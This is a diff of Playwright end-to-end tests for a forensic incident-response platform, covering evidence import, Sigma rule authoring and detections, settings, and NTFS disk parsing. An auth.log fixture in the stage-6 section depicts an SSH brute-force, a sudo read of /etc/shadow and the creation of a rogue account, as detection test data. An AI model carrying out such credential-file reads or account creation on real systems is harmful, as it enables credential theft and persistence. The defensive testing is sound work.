+  await expect(page.getByRole('region', { name: 'Incidents' })).toBeVisible()
+  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeHidden()
+  expect(new URL(page.url()).pathname).not.toContain('e2e-gone')
+  await backToMain()
+})
+
+/** An open Windows incident made through the API, and opened by its address. */
+async function openFreshIncident(id, host) {
+  expect((await page.request.post('/api/incidents', { data: { id, host, os: 'windows', data: {} } })).status()).toBe(
+    201,
+  )
+  await openIncidentAt(`/incident/${id}`)
+}
+
+test('an event-log export is read whatever its name, said to be imported when added again, and a file with two channels leaves no expected row for either', async () => {
+  test.setTimeout(120_000)
+  await openFreshIncident('e2e-files', 'E2E-FILES')
+  await openEvidence('Event Logs')
+  const exported = JSON.stringify({
+    format: 'nik-eventlogs',
+    host: 'E2E-FILES',
+    events: [
+      logEvent('Security', 4624, 31000, '2025-11-08T02:00:00Z', { TargetUserName: 'm.rossi', LogonType: '2' }),
+      logEvent('System', 7045, 31001, '2025-11-08T02:05:00Z', { ServiceName: 'Updater' }),
+    ],
+  })
+  const row = await addEvidence('my-export.json', exported)
+  await expect(row).toContainText('2 / 2')
+  await expect(row).toContainText('Security, System')
+  // The two channels are what the page expects first: only the two it has no file of are still grey rows.
+  await expect(sourcesTable().getByRole('cell', { name: 'System', exact: true })).toHaveCount(0)
+  await expect(sourcesTable().getByRole('cell', { name: 'Security', exact: true })).toHaveCount(0)
+  await expect(sourcesTable().locator('tbody tr').filter({ hasText: 'Not imported' })).toHaveCount(2)
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(2, { timeout: 20_000 })
+  // The same file once more: the row it has, not another one, and the records are not doubled.
+  await sourcesTable()
+    .getByLabel('Choose files to add')
+    .setInputFiles({ name: 'my-export.json', mimeType: 'application/json', buffer: Buffer.from(exported) })
+  await expect(page.getByRole('list', { name: 'Files being added' })).toContainText('Already imported', {
+    timeout: 30_000,
+  })
+  await expect(sourcesTable().getByRole('cell', { name: 'my-export.json', exact: true })).toHaveCount(1)
+  await expect(recordsTable().locator('tbody tr')).toHaveCount(2)
+})
+
+test('a file added from a page is read by the parser of that page whatever its name', async () => {
+  test.setTimeout(180_000)
+  await openEvidence('Command History')
+  await page
+    .getByRole('tablist', { name: 'Shell' })
+    .getByRole('tab', { name: /^PowerShell/ })
+    .click()
+  await addEvidence('second_history.txt', ['Get-ChildItem C:\\Finance', 'ipconfig /all', ''].join('\r\n'))
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable()).toContainText('ipconfig /all')
+
+  // Endpoint Artifacts: a CSV of the BAM the worker would not know by its name.
+  await openEvidence('Endpoint Artifacts')
+  await page.getByRole('tab', { name: /^Program Execution/ }).click()
+  await page.getByLabel('Add files as').selectOption({ label: 'BAM/DAM last execution' })
+  const bam = [
+    'name,path,runCount,source,lastRun',
+    'updater.exe,C:\\Temp\\updater.exe,3,BAM,2025-11-08T09:10:00Z',
+    '',
+  ].join('\n')
+  await addEvidence('bam-export.csv', bam)
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable()).toContainText('updater.exe')
+
+  // What the test made is taken away, and the incident of the other tests is open again.
+  expect((await page.request.delete('/api/incidents/e2e-files')).status()).toBe(204)
+  await openIncidentAt(mainIncident)
+})
+
+test('Settings → Archiving: the rule that archives the incidents closed for long is set, saved and kept', async () => {
+  await page.goto('/settings/incidents/archiving')
+  const settings = page.getByRole('region', { name: 'Settings' })
+  await expect(page.getByRole('heading', { name: 'Settings · Archiving', level: 1 })).toBeVisible()
+  const rule = settings.getByRole('switch', { name: 'Archive the incidents closed for long' })
+  const days = settings.getByLabel('Closed for more than (days)')
+  await expect(rule).toBeVisible({ timeout: 20_000 })
+  // Off at the start: the days are not asked.
+  await expect(rule).toHaveAttribute('aria-checked', 'false')
+  await expect(days).toBeDisabled()
+  await rule.click()
+  await expect(days).toBeEnabled()
+  await days.fill('0')
+  await expect(settings.getByText(/Days: a whole number from 1 to 3650/)).toBeVisible()
+  await expect(settings.getByRole('button', { name: 'Save', exact: true })).toBeDisabled()
+  await days.fill('45')
+  await settings.getByRole('button', { name: 'Save', exact: true }).click()
+  await expect(settings.getByText('Saved.')).toBeVisible()
+  await page.reload()
+  await expect(days).toHaveValue('45', { timeout: 20_000 })
+  await expect(rule).toHaveAttribute('aria-checked', 'true')
+  // Put back off: the server of the other tests archives nothing by itself.
+  await rule.click()
+  await settings.getByRole('button', { name: 'Save', exact: true }).click()
+  await expect(settings.getByText('Saved.')).toBeVisible()
+  await page.goto(mainIncident)
+  await expect(page.locator('nav[aria-label="Analysis tabs"]')).toBeVisible()
 })
 
 test('a query filters the lists: typed, completed, built from rows; the filters write it', async () => {
@@ -2865,7 +3426,7 @@ test('roles are tags: an account sees and does what its roles grant together', a
   await rita.getByRole('button', { name: 'Platform settings' }).click()
   const ritaSections = rita.getByRole('navigation', { name: 'Settings sections' })
   await expect(ritaSections.getByText('YARA rules')).toBeVisible()
-  await expect(ritaSections.getByText('Detection rules')).toBeVisible()
+  await expect(ritaSections.getByText('Sigma rules')).toBeVisible()
   for (const hidden of ['Accounts and roles', 'API keys', 'Audit log', 'Storage', 'Backup', 'Threat intelligence']) {
     await expect(ritaSections.getByText(hidden, { exact: true })).toHaveCount(0)
   }
@@ -5115,7 +5676,11 @@ test('the War Room holds what was said and done on the incident, and marks evide
   await inspector.getByRole('button', { name: 'Mark as evidence' }).click()
   await expect(note).toContainText('evidence')
   await show.getByRole('button', { name: 'Evidence' }).click()
-  await expect(stream.getByRole('listitem').filter({ hasText: /\S/ })).toHaveCount(1)
+  // The acknowledgement of a file read in part (an earlier test) is marked as evidence by itself, with its note.
+  await expect(
+    stream.getByRole('listitem').filter({ hasText: 'acknowledged that partial/nik-eventlogs.json was read in part' }),
+  ).toHaveCount(1)
+  await expect(stream.getByRole('listitem').filter({ hasText: /\S/ })).toHaveCount(2)
   await expect(note).toHaveCount(1)
   // It is a note of the incident like any other: the Summary shows it.
   await tabs.getByRole('button', { name: 'Summary', exact: true }).click()
@@ -5882,6 +6447,29 @@ test('a dashboard is built from widgets, shows real numbers, and opens what is b
   await expect(number.getByRole('button', { name: /^Incidents now: \d+\. Show them\.$/ })).toBeVisible()
   const bars = boards.getByRole('article', { name: 'By status' })
   await expect(bars.getByRole('listitem').first()).toContainText('open')
+
+  // The refresh button brings the numbers up to date without leaving the page.
+  const countOf = async () =>
+    Number(
+      (await number.getByRole('button', { name: /Show them/ }).getAttribute('aria-label'))?.match(/: (\d+)\./)?.[1],
+    )
+  const before = await countOf()
+  const address = page.url()
+  await page.evaluate(() => (window.__noReload = true))
+  expect(
+    (
+      await page.request.post('/api/incidents', {
+        // Dated now: the number counts the incidents of the last 30 days, by when they were opened.
+        data: { id: 'e2e-board-refresh', host: 'E2E-BOARD-REFRESH', createdAt: new Date().toISOString(), data: {} },
+      })
+    ).status(),
+  ).toBe(201)
+  await boards.getByRole('button', { name: 'Refresh the dashboard' }).click()
+  await expect.poll(countOf).toBe(before + 1)
+  expect(page.url()).toBe(address)
+  expect(await page.evaluate(() => window.__noReload)).toBe(true)
+  await expect(boards.getByText(/^Updated \d{2}\D\d{2}\D\d{2}$/)).toBeVisible()
+  expect((await page.request.delete('/api/incidents/e2e-board-refresh')).status()).toBe(204)
 
   // The same figures as a table.
   await bars.getByRole('button', { name: 'Show By status as a table' }).click()
@@ -7220,14 +7808,14 @@ test('an entry of the rail always shows the first screen of its section, and doe
   // ---- Settings: its first section, from another one ----
   await entry('Platform settings').click()
   const settings = page.getByRole('region', { name: 'Settings' })
-  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
+  await expect(page).toHaveURL(/\/settings\/analysis\/business-hours$/)
   await settings
     .getByRole('navigation', { name: 'Settings sections' })
     .getByRole('button', { name: 'Audit log' })
     .click()
   await expect(page).toHaveURL(/audit-log$/)
   await entry('Platform settings').click()
-  await expect(page).toHaveURL(/\/settings\/analysis\/detection-rules$/)
+  await expect(page).toHaveURL(/\/settings\/analysis\/business-hours$/)
   await entry('Platform settings').click()
   await expect(settings).toBeVisible()
   await expect(entry('Platform settings')).toHaveAttribute('aria-pressed', 'true')
@@ -8191,27 +8779,20 @@ test('the menu in a dialog, on selected text, in the query box, on a link, and f
   await openEvidence('Malware Analysis')
 })
 
-test('an address from the evidence is opened only after asking', async () => {
+test('an address from the evidence is never a link: the row menu copies it defanged, and nothing opens it', async () => {
   await openEvidence('Browser Forensics')
-  await page
-    .getByRole('navigation', { name: 'Browser analysis sections' })
-    .getByRole('button', { name: /^Bookmarks/ })
-    .click()
-  const open = page.getByRole('button', { name: 'Open the address' }).first()
-  await expect(open).toBeVisible()
+  await page.getByRole('tab', { name: /^Bookmarks/ }).click()
+  const first = recordsTable().locator('tbody tr').first()
+  await expect(first).toBeVisible({ timeout: 20_000 })
   // No link to the suspect's address is left in the page for a stray click.
   await expect(page.locator('main a[target="_blank"]')).toHaveCount(0)
-
-  const popups = []
-  page.context().on('page', (popup) => popups.push(popup))
-  await open.click()
-  const ask = page.getByRole('dialog', { name: 'Open an address from the evidence?' })
-  await expect(ask).toContainText('from your workstation')
-  await expect(ask).toContainText(/hxxps?\[:\]\/\//)
-  await ask.getByRole('button', { name: 'Copy defanged' }).click()
-  await ask.getByRole('button', { name: 'Cancel' }).click()
-  await expect(ask).toHaveCount(0)
-  expect(popups).toEqual([])
+  await first.click({ button: 'right' })
+  const menu = page.getByRole('menu').last()
+  await expect(menu.getByRole('menuitem', { name: 'Copy the address defanged' })).toBeVisible()
+  await expect(menu.getByRole('menuitem', { name: 'Open in URL analysis' })).toBeVisible()
+  // Nothing of the menu opens the address in the analyst's own browser.
+  await expect(menu.getByRole('menuitem', { name: /my browser|Open the address/ })).toHaveCount(0)
+  await page.keyboard.press('Escape')
 })
 
 test('setting a second factor up asks for the password first, when the sign-in is not of a moment ago', async () => {
@@ -8565,9 +9146,614 @@ test('a viewer selects and takes out, and is offered nothing that changes', asyn
   await other.close()
 })
 
+// ---------------------------------------------------------------------------------------------------------------------
+// Sigma detection on host evidence (7.0, stage 5)
+// ---------------------------------------------------------------------------------------------------------------------
+
+/** A screenshot at 1440x900 for the documentation, only when the run asks for them (SHOTS_DIR). */
+async function shot(name, show = null) {
+  if (!process.env.SHOTS_DIR) return
+  await page.setViewportSize({ width: 1440, height: 900 })
+  // What the picture is about is brought to the top of the window.
+  if (show) await show.evaluate((element) => element.scrollIntoView({ block: 'start' }))
+  await page.waitForTimeout(400)
+  await page.screenshot({ path: `${process.env.SHOTS_DIR}/${name}.png` })
+}
+
+const SIGMA_RULE_ID = 'a3b1d7e2-5c64-4f0e-9d1a-2e7c9b0f4a11'
+
+/** The text of a Sigma rule for the log-cleared event, with the condition it is given (a wrong one makes a mistake). */
+const sigmaRuleText = (condition = 'selection', title = 'E2E log cleared by hand') =>
+  [
+    `title: ${title}`,
+    `id: ${SIGMA_RULE_ID}`,
+    'status: experimental',
+    'description: Found by the end-to-end test.',
+    'author: E2E Analyst',
+    'date: 2026/11/25',
+    'logsource:',
+    '    product: windows',
+    '    service: security',
+    'detection:',
+    '    selection:',
+    '        EventID: 1102',
+    `    condition: ${condition}`,
+    'level: low',
+    '',
+  ].join('\n')
+
+/** The settings page open on a section by its address (the page is read again, so what changed elsewhere shows). */
+async function openSettingsAt(path) {
+  await page.goto(path)
+  const settings = page.getByRole('region', { name: 'Settings' })
+  await expect(settings).toBeVisible()
+  return settings
+}
+
+/** Replace the text of the YAML editor. */
+async function writeInEditor(text) {
+  const editor = page.getByRole('textbox', { name: 'Sigma rule, YAML' })
+  await editor.click()
+  await page.keyboard.press('Control+A')
+  await page.keyboard.insertText(text)
+}
+
+test('a Sigma rule is written with a mistake, mended, saved, listed, switched off and on, and deleted', async () => {
+  test.setTimeout(180_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  const settings = await openSettingsAt('/settings/rules/sigma')
+  await expect(settings.getByRole('heading', { name: 'Sigma rules', level: 2 })).toBeVisible()
+  // The list: the rules of the Nik pack are here, and the line over it counts them.
+  await expect(settings.getByRole('status').filter({ hasText: /\d+ rules? ·/ })).toBeVisible({ timeout: 30_000 })
+  await settings.getByPlaceholder('Search title, id, name or author…').fill('Security Event Log Cleared')
+  await expect(settings.getByRole('row').filter({ hasText: 'Windows Security Event Log Cleared' })).toBeVisible({
+    timeout: 30_000,
+  })
+  await settings.getByPlaceholder('Search title, id, name or author…').fill('')
+  await expect(settings.getByRole('row').nth(1)).toBeVisible({ timeout: 30_000 })
+  await shot('sigma-rules-list')
+
+  // A new rule starts from a template that the worker reads without a problem.
+  await settings.getByRole('button', { name: 'New rule' }).click()
+  await expect(settings.getByText('The worker reads this text without a problem.')).toBeVisible({ timeout: 30_000 })
+  await expect(settings.getByRole('complementary', { name: 'What the rule is' })).toContainText(
+    'Nik can run this rule.',
+  )
+
+  // A condition that names a selection that does not exist: the mistake shows on its line, with a mark in the editor.
+  await writeInEditor(sigmaRuleText('selecton'))
+  const errors = settings.getByRole('list', { name: 'Errors in the rule' })
+  await expect(errors).toBeVisible({ timeout: 30_000 })
+  await expect(errors.getByRole('button').first()).toHaveText(/^Line \d+: /)
+  await expect(page.locator('.cm-lintRange-error').first()).toBeVisible()
+  await expect(page.locator('.cm-lint-marker-error').first()).toBeVisible()
+  await expect(settings.getByRole('button', { name: 'Save rule' })).toBeDisabled()
+  await shot('sigma-rule-editor-error')
+
+  // Mended: the rule is read, what it is shows beside the editor, and Save writes it.
+  await writeInEditor(sigmaRuleText('selection'))
+  await expect(errors).toHaveCount(0, { timeout: 30_000 })
+  const card = settings.getByRole('complementary', { name: 'What the rule is' })
+  await expect(card).toContainText('E2E log cleared by hand')
+  await expect(card).toContainText('E2E Analyst')
+  await expect(card).toContainText('windows / security')
+  await settings.getByRole('button', { name: 'Save rule' }).click()
+  await expect(settings.getByRole('heading', { name: 'Sigma rules', level: 2 })).toBeVisible({ timeout: 30_000 })
+
+  // Listed, and on (a rule written here that Nik can run is on).
+  await settings.getByPlaceholder('Search title, id, name or author…').fill('E2E log cleared')
+  const row = settings.getByRole('row').filter({ hasText: 'E2E log cleared by hand' })
+  await expect(row).toHaveCount(1, { timeout: 30_000 })
+  await expect(row).toContainText('by E2E Analyst')
+  const power = row.getByRole('switch', { name: /E2E log cleared by hand/ })
+  await expect(power).toHaveAttribute('aria-checked', 'true')
+
+  // Off and on again, and the server keeps each.
+  await power.click()
+  await expect(power).toHaveAttribute('aria-checked', 'false')
+  expect((await (await page.request.get(`/api/sigma/rules/${SIGMA_RULE_ID}`)).json()).enabled).toBe(false)
+  await power.click()
+  await expect(power).toHaveAttribute('aria-checked', 'true')
+  expect((await (await page.request.get(`/api/sigma/rules/${SIGMA_RULE_ID}`)).json()).enabled).toBe(true)
+
+  // Deleted: from its editor, after a question.
+  await row.getByText('E2E log cleared by hand').click()
+  await expect(settings.getByRole('heading', { name: 'E2E log cleared by hand', level: 2 })).toBeVisible()
+  await settings.getByRole('button', { name: 'Delete', exact: true }).click()
+  await page.getByRole('dialog', { name: 'Delete this rule?' }).getByRole('button', { name: 'Delete the rule' }).click()
+  await expect(settings.getByRole('heading', { name: 'Sigma rules', level: 2 })).toBeVisible({ timeout: 30_000 })
+  await expect(settings.getByRole('row').filter({ hasText: 'E2E log cleared by hand' })).toHaveCount(0)
+  expect((await page.request.get(`/api/sigma/rules/${SIGMA_RULE_ID}`)).status()).toBe(404)
+})
+
+test('an event-log export with a Security 1102 gives a detection: its rule with its author, its events, the level in the table', async () => {
+  test.setTimeout(240_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  const made = await page.request.post('/api/incidents', {
+    data: { id: 'e2e-sigma', host: 'E2E-SIGMA', os: 'windows', data: {} },
+  })
+  expect(made.status()).toBe(201)
+  const export1102 = JSON.stringify({
+    format: 'nik-eventlogs',
+    host: 'E2E-SIGMA',
+    events: [
+      logEvent('Security', 4688, 9800, '2025-11-07T02:20:00Z', { NewProcessName: 'C:\\Windows\\System32\\cmd.exe' }),
+      logEvent('Security', 1102, 9801, '2025-11-07T02:30:00Z', { SubjectUserName: 'j.alvarez' }),
+      logEvent('Application', 1000, 9802, '2025-11-07T02:31:00Z', { Application: 'excel.exe' }),
+    ],
+  })
+  const sent = await page.request.post('/api/incidents/e2e-sigma/upload?tab=eventlogs', {
+    multipart: { file: { name: 'nik-eventlogs.json', mimeType: 'application/json', buffer: Buffer.from(export1102) } },
+  })
+  expect(sent.status()).toBe(200)
+  await openIncidentAt('/incident/e2e-sigma')
+  await openEvidence('Event Logs')
+  await waitRead('nik-eventlogs.json')
+
+  // The tabs: Events and Detections, each with its count.
+  const parts = page.getByRole('tablist', { name: 'Parts of the event logs' })
+  await expect(parts.getByRole('tab', { name: /^Events/ })).toBeVisible({ timeout: 30_000 })
+  await expect(parts.getByRole('tab', { name: /^Detections\s*1$/ })).toBeVisible({ timeout: 30_000 })
+  // The stat card counts the detection.
+  const stat = page.locator('.truncate.text-xs', { hasText: /^Detections$/ }).locator('xpath=..')
+  await expect(stat).toContainText('1')
+  await expect(stat).toContainText('1 high')
+  // The facts of the incident are folded for the picture, so that the table has the width to show its columns.
+  if (process.env.SHOTS_DIR) await page.getByRole('button', { name: "Hide the incident's facts" }).click()
+  await shot('eventlogs-events-with-levels', parts)
+  if (process.env.SHOTS_DIR) await page.getByRole('button', { name: "Show the incident's facts" }).click()
+
+  // The Detections tab lists the rule of the Nik pack, with its author, its level, its tags and its count.
+  await parts.getByRole('tab', { name: /^Detections/ }).click()
+  const rules = page.getByRole('tabpanel', { name: 'Detections' })
+  const found = rules.getByRole('row').filter({ hasText: 'Windows Security Event Log Cleared' })
+  await expect(found).toHaveCount(1, { timeout: 30_000 })
+  await expect(found).toContainText('Rule by Nik')
+  await expect(found).toContainText('high')
+  await expect(found).toContainText('T1070.001')
+  await expect(found).toContainText('WKS-FINANCE-01')
+  await shot('eventlogs-detections', parts)
+
+  // A row opens the events of the rule: Events, filtered on it, with a chip that can be removed.
+  await found.getByRole('button', { name: /Show the events that matched/ }).click()
+  await expect(parts.getByRole('tab', { name: /^Events/ })).toHaveAttribute('aria-selected', 'true')
+  const chips = page.getByRole('list', { name: 'Filters in force' })
+  await expect(chips).toContainText('rule = Windows Security Event Log Cleared')
+  const table = recordsTable()
+  await expect(table.locator('tbody tr')).toHaveCount(1, { timeout: 30_000 })
+  await expect(table.locator('tbody tr').first()).toContainText('1102')
+  // The record's level shows in its row.
+  await expect(table.locator('tbody tr').first().getByText('high', { exact: true })).toBeVisible()
+
+  // Its drawer lists the detection with the author.
+  await table.locator('tbody tr').first().getByRole('button', { name: 'Source' }).click()
+  const drawer = page.getByRole('dialog', { name: 'Source of the record' })
+  const inRecord = drawer.getByRole('region', { name: 'Detections' })
+  await expect(inRecord).toContainText('Windows Security Event Log Cleared', { timeout: 30_000 })
+  await expect(inRecord).toContainText('Rule by Nik')
+  await expect(inRecord).toContainText('T1070.001')
+  await shot('record-drawer-detections')
+  await drawer.getByRole('button', { name: 'Close' }).click()
+
+  // The chip comes off: the events of the file are back.
+  await chips.getByRole('button', { name: /Remove the filter rule/ }).click()
+  await expect(table.locator('tbody tr')).not.toHaveCount(1, { timeout: 30_000 })
+
+  // The level select keeps the records of a minimum level.
+  await page.getByRole('combobox', { name: /^Detection/ }).selectOption('4')
+  await expect(table.locator('tbody tr')).toHaveCount(1, { timeout: 30_000 })
+  await page.getByRole('combobox', { name: /^Detection/ }).selectOption('')
+
+  // The parse report of the file says what the rules found in it.
+  await sourceRow('nik-eventlogs.json').getByRole('button', { name: 'Report' }).click()
+  const report = page.getByRole('region', { name: 'Parse report of nik-eventlogs.json' })
+  const reported = report.getByRole('region', { name: 'Detections of this file' })
+  await expect(reported).toContainText('Windows Security Event Log Cleared')
+  await expect(reported).toContainText('1 high')
+  await shot('parse-report-detections', report)
+
+  // The Timeline counts it too, and its host records carry the level.
+  await page.locator('nav[aria-label="Analysis tabs"]').getByRole('button', { name: 'Timeline', exact: true }).click()
+  const timelineStat = page.locator('.truncate.text-xs', { hasText: /^Detections$/ }).locator('xpath=..')
+  await expect(timelineStat).toContainText('1', { timeout: 30_000 })
+  await expect(page.getByRole('table').last().getByText('high', { exact: true }).first()).toBeVisible({
+    timeout: 30_000,
+  })
+  await shot('timeline-detections')
+})
+
+test('"Try on an incident" runs the text on screen over the records of an incident and finds the match', async () => {
+  test.setTimeout(180_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  const settings = await openSettingsAt('/settings/rules/sigma')
+  await settings.getByRole('button', { name: 'New rule' }).click()
+  await writeInEditor(sigmaRuleText('selection', 'E2E log cleared, tried only'))
+  await expect(settings.getByText('The worker reads this text without a problem.')).toBeVisible({ timeout: 30_000 })
+  const trying = settings.getByRole('region', { name: 'Try on an incident' })
+  await trying.getByRole('combobox', { name: 'Incident' }).fill('E2E-SIGMA')
+  await trying.getByRole('option').first().click()
+  await trying.getByRole('button', { name: 'Run' }).click()
+  await expect(trying).toContainText('1 match', { timeout: 60_000 })
+  await expect(trying.getByRole('row').filter({ hasText: 'E2E log cleared, tried only' })).toHaveCount(1)
+  await expect(trying.getByRole('link', { name: 'Open the incident' })).toHaveAttribute('href', '/incident/e2e-sigma')
+  await shot('sigma-rule-editor-try', trying)
+  // Nothing was saved by it.
+  expect((await page.request.get(`/api/sigma/rules/${SIGMA_RULE_ID}`)).status()).toBe(404)
+  // Back to the list: the text was changed and not saved, so Nik asks before it is left.
+  await settings.getByRole('button', { name: 'Sigma rules' }).last().click()
+  await page
+    .getByRole('dialog', { name: 'Leave without saving?' })
+    .getByRole('button', { name: 'Leave without saving' })
+    .click()
+  await expect(settings.getByRole('heading', { name: 'Sigma rules', level: 2 })).toBeVisible()
+})
+
+test('the list of suspicious keywords is gone: its old address leads to the Sigma rules', async () => {
+  const settings = await openSettingsAt('/settings/analysis/detection-rules')
+  await expect(settings.getByRole('heading', { name: 'Sigma rules', level: 2 })).toBeVisible()
+  const sections = settings.getByRole('navigation', { name: 'Settings sections' })
+  await expect(sections.getByRole('button', { name: 'Detection rules' })).toHaveCount(0)
+  expect(Object.keys(await (await page.request.get('/api/settings')).json())).not.toContain('keywords')
+})
+
+test('the business hours are told in a time zone, which the rules and the timers use', async () => {
+  await page.setViewportSize({ width: 1440, height: 900 })
+  const settings = await openSettingsAt('/settings/analysis/business-hours')
+  const zone = settings.getByLabel('Time zone')
+  await expect(zone).toHaveValue('UTC')
+  await zone.fill('Europe/Rome')
+  await expect
+    .poll(async () => (await (await page.request.get('/api/settings')).json()).businessHours.tz, { timeout: 15_000 })
+    .toBe('Europe/Rome')
+  await shot('business-hours-tz')
+  await page.reload()
+  await expect(settings.getByLabel('Time zone')).toHaveValue('Europe/Rome')
+  // Put back.
+  await settings.getByLabel('Time zone').fill('UTC')
+  await expect
+    .poll(async () => (await (await page.request.get('/api/settings')).json()).businessHours.tz, { timeout: 15_000 })
+    .toBe('UTC')
+})
+
+/* ---- 7.0, stage 6: the Disk page, the registry hives, the logs of Linux, the collections, and the files that find their page ---- */
+
+/** A picture of what is wide: the facts of the incident are folded so that the page has the room, then shown again. */
+async function shotWide(name, show) {
+  if (!process.env.SHOTS_DIR) return
+  const fold = page.getByRole('button', { name: "Hide the incident's facts" })
+  const folded = await fold.isVisible().catch(() => false)
+  if (folded) await fold.click()
+  await shot(name, show)
+  if (folded) await page.getByRole('button', { name: "Show the incident's facts" }).click()
+}
+
+/** An incident of a system made through the API, the way a script would, and opened by its address. */
+async function openFreshIncidentOf(id, host, os) {
+  expect((await page.request.post('/api/incidents', { data: { id, host, os, data: {} } })).status()).toBe(201)
+  await openIncidentAt(`/incident/${id}`)
+}
+
+/** An auth.log of a host that was guessed at: failed logons, a logon, a sudo, a new account. */
+const AUTH_LOG = [
+  ...Array.from(
+    { length: 12 },
+    (_, n) =>
+      `Nov 24 03:1${n % 10}:0${n % 6} web01 sshd[2${n}]: Failed password for root from 198.51.100.9 port 42${n} ssh2`,
+  ),
+  'Nov 24 03:20:01 web01 sshd[300]: Accepted password for root from 198.51.100.9 port 4300 ssh2',
+  'Nov 24 03:21:00 web01 sudo:    root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow',
+  'Nov 24 03:22:00 web01 useradd[400]: new user: name=support2, UID=1001, GID=1001, home=/home/support2, shell=/bin/bash',
+  '',
+].join('\n')
+
+test('Disk (NTFS): a $MFT is read, its deleted entries are filtered, a record opens its original, and the $J has its own tab', async () => {
+  test.setTimeout(300_000)
+  await page.setViewportSize({ width: 1440, height: 900 })
+  await openFreshIncidentOf('e2e-s6-disk', 'E2E-DISK', 'windows')
+  await openEvidence('Disk (NTFS)')
+  const files = page.getByRole('tablist', { name: 'Disk files' })
+  await expect(files.getByRole('tab', { name: /^\$MFT/ })).toHaveAttribute('aria-selected', 'true')
+  await expect(files.getByRole('tab', { name: /^\$J/ })).toBeVisible()
+  // Nothing is there yet: the grey row of the file, with where to find it, is the empty state.
+  await expect(sourcesTable()).toContainText('Not imported')
+  await expect(sourcesTable()).toContainText('KAPE')
+
+  const row = await addEvidence('MFT', fixture('stage6/MFT'), /read in part|complete/)
+  await expect(row).toContainText('$MFT')
+  const entries = page.locator('.truncate.text-xs', { hasText: /^Entries$/ }).locator('xpath=..')
+  await expect(entries).toContainText(/\d/, { timeout: 30_000 })
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  await expect(page.getByRole('columnheader', { name: /Created \(SI\)/ })).toBeVisible()
+  // The other seven times are columns the person asks for, not on by default.
+  await expect(page.getByRole('columnheader', { name: /Accessed \(FN\)/ })).toHaveCount(0)
+  const everything = await page
+    .getByRole('status')
+    .filter({ hasText: /of \d+/ })
+    .first()
+    .innerText()
+  const total = Number(/of ([\d,]+)/.exec(everything)[1].replace(/,/g, ''))
+  expect(total).toBeGreaterThan(10)
+  await shotWide('disk-mft', page.getByRole('tablist', { name: 'Parts of the disk page' }))
+
+  // The filters are independent: State, Type, Alternate stream and Zone. The server filters, and the count is the card's.
+  const deleted = page.locator('.truncate.text-xs', { hasText: /^Deleted$/ }).locator('xpath=..')
+  await expect(deleted).toContainText(/[1-9]/)
+  const counted = page
+    .getByRole('status')
+    .filter({ hasText: /of \d+/ })
+    .first()
+  await page.getByRole('combobox', { name: 'State', exact: true }).selectOption({ label: 'Deleted' })
+  await expect(counted).not.toHaveText(everything, { timeout: 20_000 })
+  const rows = recordsTable().locator('tbody tr')
+  await expect(rows.first()).toBeVisible()
+  expect(await rows.filter({ hasText: 'deleted' }).count()).toBe(await rows.count())
+  // A second filter narrows it further instead of replacing the first.
+  const deletedCount = await counted.innerText()
+  await page.getByRole('combobox', { name: 'Entry type', exact: true }).selectOption({ label: 'Directory' })
+  await expect(page.getByRole('combobox', { name: 'State', exact: true })).toHaveValue('deleted')
+  await expect(counted).not.toHaveText(deletedCount, { timeout: 20_000 })
+  await page.getByRole('combobox', { name: 'State', exact: true }).selectOption({ label: 'Any state' })
+  await expect(rows.first()).toBeVisible({ timeout: 20_000 })
+  expect(await rows.filter({ hasText: 'directory' }).count()).toBe(await rows.count())
+  // The alternate stream and the zone are filters of their own, and "any" gives everything back.
+  await page
+    .getByRole('combobox', { name: 'Alternate stream', exact: true })
+    .selectOption({ label: 'Has an alternate stream' })
+  await page.getByRole('combobox', { name: 'Zone', exact: true }).selectOption({ label: 'Internet (3)' })
+  await expect(page.getByRole('combobox', { name: 'Entry type', exact: true })).toHaveValue('directory')
+  await page.getByRole('combobox', { name: 'Alternate stream', exact: true }).selectOption({ label: 'Any' })
+  await page.getByRole('combobox', { name: 'Zone', exact: true }).selectOption({ label: 'Any zone' })
+  await page.getByRole('combobox', { name: 'Entry type', exact: true }).selectOption({ label: 'Any type' })
+  await expect(counted).toHaveText(everything, { timeout: 20_000 })
+
+  // A record's drawer lists every field, and the original is the whole file as bytes.
+  await recordsTable().getByRole('button', { name: 'Source' }).first().click()
+  const drawer = page.getByRole('dialog', { name: 'Source of the record' })
+  await expect(drawer).toBeVisible()
+  await expect(drawer.getByRole('region', { name: 'What Nik extracted' })).toContainText('siCreated')
+  await drawer.getByRole('group', { name: 'What to show' }).getByRole('button', { name: 'Whole file' }).click()
+  await expect(drawer.getByRole('heading', { name: 'Source file' })).toBeVisible()
+  await page.keyboard.press('Escape')
+  await expect(drawer).toHaveCount(0)
+
+  // The $J is the other tab: its own grey row, then its records with the reasons as chips.
+  await files.getByRole('tab', { name: /^\$J/ }).click()
+  await expect(sourcesTable()).toContainText('sparse')
+  await addEvidence('UsnJrnl_J', fixture('stage6/UsnJrnl_J'), /read in part|complete/)
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 30_000 })
+  await expect(recordsTable()).toContainText('setup.exe')
+  await expect(recordsTable().getByText('FILE_CREATE').first()).toBeVisible()
+  await expect(page.getByRole('combobox', { name: 'Reason', exact: true })).toBeVisible()
+  // The Reason filter lists the single reasons, and a record holding one of them is kept (a list of reasons is asked,
+  // not a combination).
+  const reasons = page.getByRole('combobox', { name: 'Reason', exact: true })
+  await expect(reasons.locator('option', { hasText: /^CLOSE$/ })).toHaveCount(1)
+  const usnCount = page
+    .getByRole('status')
+    .filter({ hasText: /of \d+/ })
+    .first()
+  const usnAll = await usnCount.innerText()
+  await reasons.selectOption({ label: 'FILE_CREATE' })
+  await expect(recordsTable().locator('tbody tr').first()).toBeVisible({ timeout: 20_000 })
+  await expect(recordsTable().locator('tbody tr').filter({ hasNotText: 'FILE_CREATE' })).toHaveCount(0)
+  await reasons.selectOption({ label: 'Any reason' })
+  await expect(usnCount).toHaveText(usnAll, { timeout: 20_000 })
